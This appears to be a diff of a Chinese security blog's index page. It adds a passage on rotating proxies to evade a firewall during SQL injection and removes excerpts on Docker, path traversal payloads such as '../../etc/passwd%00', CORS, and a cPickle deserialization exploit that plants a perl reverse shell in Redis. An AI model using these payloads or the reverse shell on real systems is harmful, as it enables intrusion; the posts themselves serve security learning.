+				<span class="token keyword">print</span> <span class="token string">"[*]TimeCompare: %s"</span> <span class="token operator">%</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>time<span class="token punctuation">.</span>time<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">-</span>now<span class="token punctuation">)</span> <span class="token operator">-</span> testtime<span class="token punctuation">)</span>
+				<span class="token keyword">print</span> <span class="token string">"="</span> <span class="token operator">*</span> <span class="token number">30</span>
+				<span class="token keyword">break</span>
+		<span class="token keyword">except</span> Exception<span class="token punctuation">:</span>
+			<span class="token keyword">pass</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>开个proxypool.py，然后<code>http://127.0.0.1:1111/time&lt;4</code>找个稍微好点的代理，就这样循环下去吧，这样每次请求目标之后，都会切换到下个代理。所以就不会触发防火墙啦，具体效果再说。</p>
+<p>实测还没测出来，感觉有点悬。</p>
+
+	
+	</div>
+  <a type="button" href="/2016/11/08/sql-proxy.html#more" class="btn btn-default more">Read More</a>
+</div>
+
+		
+			
+	
+	<!-- display as entry -->
+<div class="row">
+	<div class="col-md-8">
+		<h3 class="title">
 			<a href="/2016/10/25/cve-2016-6802.html" >CVE-2016-6802</a>
 		</h3>
 		</div>
@@ -181,438 +681,6 @@ if (&quot;&#x2F;&quot;.equeal(contextPath)) &#123;
 </div>
 
 		
-			
-	
-	<!-- display as entry -->
-<div class="row">
-	<div class="col-md-8">
-		<h3 class="title">
-			<a href="/2016/10/08/docker.html" >Docker笔记</a>
-		</h3>
-		</div>
-	<div class="col-md-4">
-		<div class="date">post @ 2016-10-08  </div>
-		</div>
-	</div>
-	
-
-
-			<!--
-<div class="entry">
-  <div class="row">
-	
-	
-		<ul>
-<li>Docker container(容器): 应用在内部跑，有自己完整的文件系统和操作系统。</li>
-<li>Docker image(镜像): 应用代码各种库和文件打包一个文件，这个就是image，需要加载到容器才能运行。</li>
-</ul>
-<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">docker</span> info  <span class="token comment">#列出container和image的数量，宿主操作系统等</span>
-
-<span class="token function">docker</span> run -t -i ubuntu /bin/bash
-<span class="token comment">#run 运行一个容器，-t 创造一个伪TTY, -i表示吧STDIN打开，这两个参数是让终端可用，ubuntu是指镜像名，/bin/bash是要运行的命令。exit或者Ctrl+d 退出</span>
-
-<span class="token function">docker</span> <span class="token function">ps</span> -a <span class="token comment">#查看有哪些容器在运行</span>
-
-<span class="token function">docker</span> start e0521aa52895 <span class="token comment">#启动那个容器</span>
-<span class="token function">docker</span> attach e0521aa52895 <span class="token comment">#再次登录上去，不能用run，否则会新建一个容器</span>
-
-上面两个命令用一个命令代替：
-<span class="token function">docker</span> start -a -i e0521aa52895
-<span class="token comment"># -a 表示attach， -i 表示开启stdin</span>
-
-如果想多连shell，attach命令会卡，可以用exec让这个容器再运行一个bash
-<span class="token function">docker</span> <span class="token builtin class-name">exec</span> -i -t e0521aa52895 /bin/bash
-
-<span class="token function">docker</span> <span class="token function">rm</span> e0521aa52895 <span class="token comment">#删除容器</span>
-<span class="token function">docker</span> <span class="token function">rm</span> <span class="token variable"><span class="token variable">$(</span><span class="token function">docker</span> <span class="token function">ps</span> -q -f <span class="token assign-left variable">status</span><span class="token operator">=</span>exited<span class="token variable">)</span></span>d
-<span class="token comment">#删除所有退出状态的容器</span>
-
-<span class="token function">docker</span> run -it -p <span class="token number">8888</span>:80 imagine10255/centos6-lnmp-php56
-<span class="token comment">#lnmp的80端口映射到8888端口，并且开启一个交互的shell</span>
-
-<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-
-<p>我想要docker在后台运行，每次都可以进去修改一些东西，但是查了资料不太如意，docker后台运行的时候，他里面必须要有一个程序一直在运行。为了偷懒我用了screen，然后<code>docker run -it -p 8888:80 --name web  imagine10255/centos6-lnmp-php56</code>，这样退出之后使用<code>docker exec -t -i 35f89fd74804 /bin/bash</code>。突然感觉好方便=。=</p>
-<pre class="line-numbers language-none"><code class="language-none">给docker起一个名字之后可以这样执行命令
-docker exec web ls
-docker start web
-docker port web<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
-
-<p>docker修改了部分文件之后可以先退出，使得docker的container是exited状态，然后docker commit 3d1d1748aaeb web 这样保存，下次直接运行web这个images即可。</p>
-<pre class="line-numbers language-none"><code class="language-none">docker save IMAGENAMW |bazip2 -9 -c &gt; img.tar.bz2
-bzip2 -d -c &lt; img.tar.bz2 |docker load
-
-
-docker export &lt;container id&gt; |bzip2 -9 -c &gt; img.tar.bz2
-bzip2 -d -c &lt; img.tar.bz2 | docker import - name&#x2F;versio:tag<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-
-<p>现在做一个lnmp的docker，使用ubuntu12.04,lnmp1.3版本，dockerfile如下</p>
-<pre class="line-numbers language-none"><code class="language-none">FROM ubuntu:12.04
-
-ENV ROOT_PATH &#x2F;root
-RUN apt-get update &amp;&amp; apt-get upgrade -y &amp;&amp; apt-get install axel -y &amp;&amp; apt-get install net-tools -y
-WORKDIR $ROOT_PATH
-RUN axel ftp:&#x2F;&#x2F;soft.vpser.net&#x2F;lnmp&#x2F;lnmp1.3-full.tar.gz &amp;&amp; tar zxvf lnmp1.3-full.tar.gz &amp;&amp; cd lnmp1.3-full
-WORKDIR &#x2F;root&#x2F;lnmp1.3-full
-RUN echo -e 8e17f72 | bash install.sh
-
-
-EXPOSE 80 3306 9000
-CMD [&quot;bash&quot;]<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-
-<p><code> docker build -t user/lnmp:tag  .</code>，在vps上面等等就ok，最后可以看到新生成的images，<code>docker start -it IMAGEID bash</code>删除一些东西，mysql进不去可以这样修改</p>
-<pre class="line-numbers language-none"><code class="language-none">&#x2F;etc&#x2F;init.d&#x2F;mysql stop
-mysqld_safe --user&#x3D;mysql --skip-grant-tables --skip-networking &amp;
-mysql -uroot -p
-
-update user set Password&#x3D;PASSWORD(&#39;newpassword&#39;) where USER&#x3D;&#39;root&#39;
-FLUSH PRIVILEGES;
-quit
-<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-	
-
-	</div>
-  <a type="button" href="/2016/10/08/docker.html#more" class="btn btn-default more">Read More</a>
-</div>
-
--->
-<div class="entry">
-  <div class="row">
-	
-	
-		<ul>
-<li>Docker container(容器): 应用在内部跑，有自己完整的文件系统和操作系统。</li>
-<li>Docker image(镜像): 应用代码各种库和文件打包一个文件，这个就是image，需要加载到容器才能运行。</li>
-</ul>
-<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">docker</span> info  <span class="token comment">#列出container和image的数量，宿主操作系统等</span>
-
-<span class="token function">docker</span> run -t -i ubuntu /bin/bash
-<span class="token comment">#run 运行一个容器，-t 创造一个伪TTY, -i表示吧STDIN打开，这两个参数是让终端可用，ubuntu是指镜像名，/bin/bash是要运行的命令。exit或者Ctrl+d 退出</span>
-
-<span class="token function">docker</span> <span class="token function">ps</span> -a <span class="token comment">#查看有哪些容器在运行</span>
-
-<span class="token function">docker</span> start e0521aa52895 <span class="token comment">#启动那个容器</span>
-<span class="token function">docker</span> attach e0521aa52895 <span class="token comment">#再次登录上去，不能用run，否则会新建一个容器</span>
-
-上面两个命令用一个命令代替：
-<span class="token function">docker</span> start -a -i e0521aa52895
-<span class="token comment"># -a 表示attach， -i 表示开启stdin</span>
-
-如果想多连shell，attach命令会卡，可以用exec让这个容器再运行一个bash
-<span class="token function">docker</span> <span class="token builtin class-name">exec</span> -i -t e0521aa52895 /bin/bash
-
-<span class="token function">docker</span> <span class="token function">rm</span> e0521aa52895 <span class="token comment">#删除容器</span>
-<span class="token function">docker</span> <span class="token function">rm</span> <span class="token variable"><span class="token variable">$(</span><span class="token function">docker</span> <span class="token function">ps</span> -q -f <span class="token assign-left variable">status</span><span class="token operator">=</span>exited<span class="token variable">)</span></span>d
-<span class="token comment">#删除所有退出状态的容器</span>
-
-<span class="token function">docker</span> run -it -p <span class="token number">8888</span>:80 imagine10255/centos6-lnmp-php56
-<span class="token comment">#lnmp的80端口映射到8888端口，并且开启一个交互的shell</span>
-
-<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-
-<p>我想要docker在后台运行，每次都可以进去修改一些东西，但是查了资料不太如意，docker后台运行的时候，他里面必须要有一个程序一直在运行。为了偷懒我用了screen，然后<code>docker run -it -p 8888:80 --name web  imagine10255/centos6-lnmp-php56</code>，这样退出之后使用<code>docker exec -t -i 35f89fd74804 /bin/bash</code>。突然感觉好方便=。=</p>
-<pre class="line-numbers language-none"><code class="language-none">给docker起一个名字之后可以这样执行命令
-docker exec web ls
-docker start web
-docker port web<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
-
-<p>docker修改了部分文件之后可以先退出，使得docker的container是exited状态，然后docker commit 3d1d1748aaeb web 这样保存，下次直接运行web这个images即可。</p>
-<pre class="line-numbers language-none"><code class="language-none">docker save IMAGENAMW |bazip2 -9 -c &gt; img.tar.bz2
-bzip2 -d -c &lt; img.tar.bz2 |docker load
-
-
-docker export &lt;container id&gt; |bzip2 -9 -c &gt; img.tar.bz2
-bzip2 -d -c &lt; img.tar.bz2 | docker import - name&#x2F;versio:tag<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-
-<p>现在做一个lnmp的docker，使用ubuntu12.04,lnmp1.3版本，dockerfile如下</p>
-<pre class="line-numbers language-none"><code class="language-none">FROM ubuntu:12.04
-
-ENV ROOT_PATH &#x2F;root
-RUN apt-get update &amp;&amp; apt-get upgrade -y &amp;&amp; apt-get install axel -y &amp;&amp; apt-get install net-tools -y
-WORKDIR $ROOT_PATH
-RUN axel ftp:&#x2F;&#x2F;soft.vpser.net&#x2F;lnmp&#x2F;lnmp1.3-full.tar.gz &amp;&amp; tar zxvf lnmp1.3-full.tar.gz &amp;&amp; cd lnmp1.3-full
-WORKDIR &#x2F;root&#x2F;lnmp1.3-full
-RUN echo -e 8e17f72 | bash install.sh
-
-
-EXPOSE 80 3306 9000
-CMD [&quot;bash&quot;]<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-
-<p><code> docker build -t user/lnmp:tag  .</code>，在vps上面等等就ok，最后可以看到新生成的images，<code>docker start -it IMAGEID bash</code>删除一些东西，mysql进不去可以这样修改</p>
-<pre class="line-numbers language-none"><code class="language-none">&#x2F;etc&#x2F;init.d&#x2F;mysql stop
-mysqld_safe --user&#x3D;mysql --skip-grant-tables --skip-networking &amp;
-mysql -uroot -p
-
-update user set Password&#x3D;PASSWORD(&#39;newpassword&#39;) where USER&#x3D;&#39;root&#39;
-FLUSH PRIVILEGES;
-quit
-<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-	
-	</div>
-  <a type="button" href="/2016/10/08/docker.html#more" class="btn btn-default more">Read More</a>
-</div>
-
-		
-			
-	
-	<!-- display as entry -->
-<div class="row">
-	<div class="col-md-8">
-		<h3 class="title">
-			<a href="/2016/09/25/whitehat-talk-web-security.html" >《白帽子讲Web安全》</a>
-		</h3>
-		</div>
-	<div class="col-md-4">
-		<div class="date">post @ 2016-09-25  </div>
-		</div>
-	</div>
-	
-
-
-			<!--
-<div class="entry">
-  <div class="row">
-	
-	
-		<h3 id="文件包含漏洞（File-Inclusion）"><a href="#文件包含漏洞（File-Inclusion）" class="headerlink" title="文件包含漏洞（File Inclusion）"></a>文件包含漏洞（File Inclusion）</h3><p>文件包含可能会出现在JSP、PHP、ASP等语言中，常见的函数如下：<br><code>PHP: include()、include_once()、require()、require_once()、fopen()、readfile()</code></p>
-<p>文件包含是PHP的一种常见用法，主要由四个函数组成：</p>
-<ul>
-<li>include()</li>
-<li>require()</li>
-<li>include_onec()</li>
-<li>require_once()</li>
-</ul>
-<p>当使用这4个函数包含一个新的文件，该文件将作为PHP代码执行，PHP内核并不会在意被包含的文件是什么类型。</p>
-<p>所以如果被包含的是txt文件，图片文件，远程URL等都会作为PHP代码执行。</p>
-<p>能够打开并且包含本地文件的漏洞称为本地文件包含漏洞（Local File Inclusion，LFI）</p>
-<p>PHP语言是由C语言实现的，因此使用了C语言中一些字符串处理函数，在连接字符串的时候，0字节（\x00）讲作为字符串结束符。所以攻击者可以加一个0字节，截断file变量后面的字符串，即<br><code>../../etc/passwd\0</code>，在get请求的时候进行Urlencode，变成<code>../../etc/passwd%00</code>。</p>
-<p>如果禁用了0字节可以利用操作系统对目录最大长度的限制，可以不需要0字节而达到截断的目的。目录字符串，在windows下256字节，Linux下4096字节会达到最大值，最大值长度之后的字符串将会被丢弃。可以通过如下构造:<br><code>../../../../../../../../../../../../../../abc</code></p>
-<ul>
-<li>%2e%2e%2f 等同于 ../</li>
-<li>%2e%2e/ 同上</li>
-<li>..%2f 同上</li>
-<li>%2e%2e%5c ..\</li>
-<li>%252%252%255c等同于..\</li>
-</ul>
-	
-
-	</div>
-  <a type="button" href="/2016/09/25/whitehat-talk-web-security.html#more" class="btn btn-default more">Read More</a>
-</div>
-
--->
-<div class="entry">
-  <div class="row">
-	
-	
-		<h3 id="文件包含漏洞（File-Inclusion）"><a href="#文件包含漏洞（File-Inclusion）" class="headerlink" title="文件包含漏洞（File Inclusion）"></a>文件包含漏洞（File Inclusion）</h3><p>文件包含可能会出现在JSP、PHP、ASP等语言中，常见的函数如下：<br><code>PHP: include()、include_once()、require()、require_once()、fopen()、readfile()</code></p>
-<p>文件包含是PHP的一种常见用法，主要由四个函数组成：</p>
-<ul>
-<li>include()</li>
-<li>require()</li>
-<li>include_onec()</li>
-<li>require_once()</li>
-</ul>
-<p>当使用这4个函数包含一个新的文件，该文件将作为PHP代码执行，PHP内核并不会在意被包含的文件是什么类型。</p>
-<p>所以如果被包含的是txt文件，图片文件，远程URL等都会作为PHP代码执行。</p>
-<p>能够打开并且包含本地文件的漏洞称为本地文件包含漏洞（Local File Inclusion，LFI）</p>
-<p>PHP语言是由C语言实现的，因此使用了C语言中一些字符串处理函数，在连接字符串的时候，0字节（\x00）讲作为字符串结束符。所以攻击者可以加一个0字节，截断file变量后面的字符串，即<br><code>../../etc/passwd\0</code>，在get请求的时候进行Urlencode，变成<code>../../etc/passwd%00</code>。</p>
-<p>如果禁用了0字节可以利用操作系统对目录最大长度的限制，可以不需要0字节而达到截断的目的。目录字符串，在windows下256字节，Linux下4096字节会达到最大值，最大值长度之后的字符串将会被丢弃。可以通过如下构造:<br><code>../../../../../../../../../../../../../../abc</code></p>
-<ul>
-<li>%2e%2e%2f 等同于 ../</li>
-<li>%2e%2e/ 同上</li>
-<li>..%2f 同上</li>
-<li>%2e%2e%5c ..\</li>
-<li>%252%252%255c等同于..\</li>
-</ul>
-	
-	</div>
-  <a type="button" href="/2016/09/25/whitehat-talk-web-security.html#more" class="btn btn-default more">Read More</a>
-</div>
-
-		
-			
-	
-	<!-- display as entry -->
-<div class="row">
-	<div class="col-md-8">
-		<h3 class="title">
-			<a href="/2016/08/29/csrf.html" >CSRF</a>
-		</h3>
-		</div>
-	<div class="col-md-4">
-		<div class="date">post @ 2016-08-29  </div>
-		</div>
-	</div>
-	
-
-
-			<!--
-<div class="entry">
-  <div class="row">
-	
-	
-		<h2 id="同源策略"><a href="#同源策略" class="headerlink" title="同源策略"></a>同源策略</h2><p>同源策略(Same Origin policy, SOP)，也称为单源策略(Single Origin policy)，用于Web浏览器编程语言的安全措施，用以保护信息的保密性和安全性。同源策略防止网站脚本访问其他站点使用脚本，也组织它与其他站点交互。<br>只要<strong>协议</strong>、<strong>端口</strong>、<strong>主机</strong>三个有一个不匹配，就是跨域请求。</p>
-<p>如果要跨域请求，有下面的限制：</p>
-<ul>
-<li>仅允许GET、HEAD、POST请求</li>
-<li>仅允许手动设置Accept、Accept-Language、Content-Language和Content-Type头</li>
-<li>Content-Type头仅允许使用application/x-www-form-urlencoded,multipart/form-data和text/plain这三种值。</li>
-</ul>
-<p>满足以上三个请求的，称为simple request<br>当上门的simple request不能满足使用场景的时候，有以下的请求解决跨域限制，都是以<code>Access-Control-</code>开头，比较重要的有：</p>
-<ul>
-<li>Access-Control-Allow-Origin：限制这个请求能从哪些URI访问。</li>
-</ul>
-<blockquote>
-<p>在使用这个请求，使用AJAX时，被调用方需要输出这个头，指名可以从哪个网站 访问，如果未输出这个头，只允许同域名的访问。</p>
-</blockquote>
-<ul>
-<li>Access-Control-Allow-Credentials: 允许这个请求使用cookie。</li>
-</ul>
-<blockquote>
-<p>一般跨域情况下，AJAX不会附带用户的Cookie，也不允许设置用户的Cookie，要使用这个的话，首先C在构造这个XMLHTTPRequest对象时，需要设置withCredentials属性。</p>
-</blockquote>
-<pre class="line-numbers language-none"><code class="language-none">XMLHttpRequest:
-
-var xhr &#x3D; new XMLHttpRequest();
-xhr.open(&#39;GET&#39;, url, true);
-xhr.withCredentials &#x3D; true;
-xhr.onreadystatechange &#x3D; handler;
-xhr.send()<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-	
-
-	</div>
-  <a type="button" href="/2016/08/29/csrf.html#more" class="btn btn-default more">Read More</a>
-</div>
-
--->
-<div class="entry">
-  <div class="row">
-	
-	
-		<h2 id="同源策略"><a href="#同源策略" class="headerlink" title="同源策略"></a>同源策略</h2><p>同源策略(Same Origin policy, SOP)，也称为单源策略(Single Origin policy)，用于Web浏览器编程语言的安全措施，用以保护信息的保密性和安全性。同源策略防止网站脚本访问其他站点使用脚本，也组织它与其他站点交互。<br>只要<strong>协议</strong>、<strong>端口</strong>、<strong>主机</strong>三个有一个不匹配，就是跨域请求。</p>
-<p>如果要跨域请求，有下面的限制：</p>
-<ul>
-<li>仅允许GET、HEAD、POST请求</li>
-<li>仅允许手动设置Accept、Accept-Language、Content-Language和Content-Type头</li>
-<li>Content-Type头仅允许使用application/x-www-form-urlencoded,multipart/form-data和text/plain这三种值。</li>
-</ul>
-<p>满足以上三个请求的，称为simple request<br>当上门的simple request不能满足使用场景的时候，有以下的请求解决跨域限制，都是以<code>Access-Control-</code>开头，比较重要的有：</p>
-<ul>
-<li>Access-Control-Allow-Origin：限制这个请求能从哪些URI访问。</li>
-</ul>
-<blockquote>
-<p>在使用这个请求，使用AJAX时，被调用方需要输出这个头，指名可以从哪个网站 访问，如果未输出这个头，只允许同域名的访问。</p>
-</blockquote>
-<ul>
-<li>Access-Control-Allow-Credentials: 允许这个请求使用cookie。</li>
-</ul>
-<blockquote>
-<p>一般跨域情况下，AJAX不会附带用户的Cookie，也不允许设置用户的Cookie，要使用这个的话，首先C在构造这个XMLHTTPRequest对象时，需要设置withCredentials属性。</p>
-</blockquote>
-<pre class="line-numbers language-none"><code class="language-none">XMLHttpRequest:
-
-var xhr &#x3D; new XMLHttpRequest();
-xhr.open(&#39;GET&#39;, url, true);
-xhr.withCredentials &#x3D; true;
-xhr.onreadystatechange &#x3D; handler;
-xhr.send()<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-	
-	</div>
-  <a type="button" href="/2016/08/29/csrf.html#more" class="btn btn-default more">Read More</a>
-</div>
-
-		
-			
-	
-	<!-- display as entry -->
-<div class="row">
-	<div class="col-md-8">
-		<h3 class="title">
-			<a href="/2016/07/26/python-cpickle-shell.html" >Python cPickle 反序列化shell</a>
-		</h3>
-		</div>
-	<div class="col-md-4">
-		<div class="date">post @ 2016-07-26  </div>
-		</div>
-	</div>
-	
-
-
-			<!--
-<div class="entry">
-  <div class="row">
-	
-	
-		<p>利用Python cPickle反序列化反弹shell，主要利用cPicle的<code>__reduce__</code>，在反序列化的时候自动执行，官方文档有如下：</p>
-<blockquote>
-<p>When a tuple is returned, it must be between two and five elements long. Optional elements can either be omitted, or None can be provided as their value. The contents of this tuple are pickled as normal and used to reconstruct the object at unpickling time. The semantics of each element are:</p>
-</blockquote>
-<p>   A callable object that will be called to create the initial version of the object. The next element of the tuple will provide arguments for this callable, and later elements provide additional state information that will subsequently be used to fully reconstruct the pickled data.</p>
-<p> <code>__reduce__</code>的返回值，第一个作为<code>callable object</code>，第二个作为参数调用，所以可以有如下反弹shell的方法:</p>
-<ul>
-<li><a target="_blank" rel="noopener" href="https://www.leavesongs.com/PENETRATION/zhangyue-python-web-code-execute.html">https://www.leavesongs.com/PENETRATION/zhangyue-python-web-code-execute.html</a></li>
-</ul>
-<pre class="line-numbers language-none"><code class="language-none">#!&#x2F;usr&#x2F;bin&#x2F;env python
-import cPickle
-import os
-import redis
-
-class exp(object):
-    def __reduce__(self):
-        s &#x3D; &quot;&quot;&quot; perl -e &#39;use Socket;$i&#x3D;&quot;xx.xx.xx.xx&quot;;$p&#x3D;443;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&quot;tcp&quot;));if(connect(S,sockaddr_in($p,inet_aton($i))))&#123;open(STDIN,&quot;&gt;&amp;S&quot;);open(STDOUT,&quot;&gt;&amp;S&quot;);open(STDERR,&quot;&gt;&amp;S&quot;);exec(&quot;&#x2F;bin&#x2F;bash -i&quot;);&#125;&#39;&quot;&quot;&quot;
-        return (os.system, (s,))
-   
-e &#x3D; exp()
-s &#x3D; cPickle.dumps(e)
-
-r &#x3D; redis.Redis(host&#x3D;&#39;xxx.xxx.xxx.xxx&#39;, port&#x3D;6379, db&#x3D;0)
-r.set(&#39;b026324c6904b2a9cb4b88d6d61c81d1&#39;)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-<p>执行之后，向目标IP写入key为b026324c6904b2a9cb4b88d6d61c81d1，其值是序列化的字符串，__reduce__函数可以反弹shell的session。<br>反弹shell指定端口 <code>nc -l -vv -p 443</code><br>然后到redis页面设置session_id，刷新之后即可反弹。</p>
-
-	
-
-	</div>
-  <a type="button" href="/2016/07/26/python-cpickle-shell.html#more" class="btn btn-default more">Read More</a>
-</div>
-
--->
-<div class="entry">
-  <div class="row">
-	
-	
-		<p>利用Python cPickle反序列化反弹shell，主要利用cPicle的<code>__reduce__</code>，在反序列化的时候自动执行，官方文档有如下：</p>
-<blockquote>
-<p>When a tuple is returned, it must be between two and five elements long. Optional elements can either be omitted, or None can be provided as their value. The contents of this tuple are pickled as normal and used to reconstruct the object at unpickling time. The semantics of each element are:</p>
-</blockquote>
-<p>   A callable object that will be called to create the initial version of the object. The next element of the tuple will provide arguments for this callable, and later elements provide additional state information that will subsequently be used to fully reconstruct the pickled data.</p>
-<p> <code>__reduce__</code>的返回值，第一个作为<code>callable object</code>，第二个作为参数调用，所以可以有如下反弹shell的方法:</p>
-<ul>
-<li><a target="_blank" rel="noopener" href="https://www.leavesongs.com/PENETRATION/zhangyue-python-web-code-execute.html">https://www.leavesongs.com/PENETRATION/zhangyue-python-web-code-execute.html</a></li>
-</ul>
-<pre class="line-numbers language-none"><code class="language-none">#!&#x2F;usr&#x2F;bin&#x2F;env python
-import cPickle
-import os
-import redis
-
-class exp(object):
-    def __reduce__(self):
-        s &#x3D; &quot;&quot;&quot; perl -e &#39;use Socket;$i&#x3D;&quot;xx.xx.xx.xx&quot;;$p&#x3D;443;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&quot;tcp&quot;));if(connect(S,sockaddr_in($p,inet_aton($i))))&#123;open(STDIN,&quot;&gt;&amp;S&quot;);open(STDOUT,&quot;&gt;&amp;S&quot;);open(STDERR,&quot;&gt;&amp;S&quot;);exec(&quot;&#x2F;bin&#x2F;bash -i&quot;);&#125;&#39;&quot;&quot;&quot;
-        return (os.system, (s,))
-   
-e &#x3D; exp()
-s &#x3D; cPickle.dumps(e)
-
-r &#x3D; redis.Redis(host&#x3D;&#39;xxx.xxx.xxx.xxx&#39;, port&#x3D;6379, db&#x3D;0)
-r.set(&#39;b026324c6904b2a9cb4b88d6d61c81d1&#39;)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-<p>执行之后，向目标IP写入key为b026324c6904b2a9cb4b88d6d61c81d1，其值是序列化的字符串，__reduce__函数可以反弹shell的session。<br>反弹shell指定端口 <code>nc -l -vv -p 443</code><br>然后到redis页面设置session_id，刷新之后即可反弹。</p>
-
-	
-	</div>
-  <a type="button" href="/2016/07/26/python-cpickle-shell.html#more" class="btn btn-default more">Read More</a>
-</div>
-
-		
 
 		</div>
 
@@ -670,7 +738,7 @@ r.set(&#39;b026324c6904b2a9cb4b88d6d61c81d1&#39;)<span aria-hidden="true" class=
 		
 			<li><a href="/categories/PWN/">PWN<span>2</span></a></li>
 		
-			<li><a href="/categories/Pentest/">Pentest<span>46</span></a></li>
+			<li><a href="/categories/Pentest/">Pentest<span>50</span></a></li>
 		
 			<li><a href="/categories/Python/">Python<span>5</span></a></li>
 		
@@ -691,23 +759,23 @@ r.set(&#39;b026324c6904b2a9cb4b88d6d61c81d1&#39;)<span aria-hidden="true" class=
   <ul class="entry list-unstyled">
     
       <li>
+        <a href="/2023/03/27/pinfish-and-osx-pentest.html" ><i class="fa fa-file-o"></i>记一次钓鱼演练和OS X下的渗透技巧</a>
+      </li>
+    
+      <li>
+        <a href="/2023/03/03/github-trick.html" ><i class="fa fa-file-o"></i>Github搜索小技巧</a>
+      </li>
+    
+      <li>
+        <a href="/2023/02/14/kafka-rce.html" ><i class="fa fa-file-o"></i>Apache Kafka Connect JNDI注入...</a>
+      </li>
+    
+      <li>
+        <a href="/2023/02/13/cname-hijack-openresty.html" ><i class="fa fa-file-o"></i>利用OpenResty进行域名流量劫持</a>
+      </li>
+    
+      <li>
         <a href="/2023/01/16/pay_vuln.html" ><i class="fa fa-file-o"></i>支付接口安全测试记录</a>
-      </li>
-    
-      <li>
-        <a href="/2022/11/08/pve_homelab.html" ><i class="fa fa-file-o"></i>PVE使用注意事项</a>
-      </li>
-    
-      <li>
-        <a href="/2022/10/27/clickhouse-sql-inject.html" ><i class="fa fa-file-o"></i>ClickHouse注入测试记录</a>
-      </li>
-    
-      <li>
-        <a href="/2022/06/23/java-agent-shell.html" ><i class="fa fa-file-o"></i>Java安全笔记(4)-Java Agent</a>
-      </li>
-    
-      <li>
-        <a href="/2022/05/17/godzilla.html" ><i class="fa fa-file-o"></i>哥斯拉原理分析</a>
       </li>
     
   </ul>
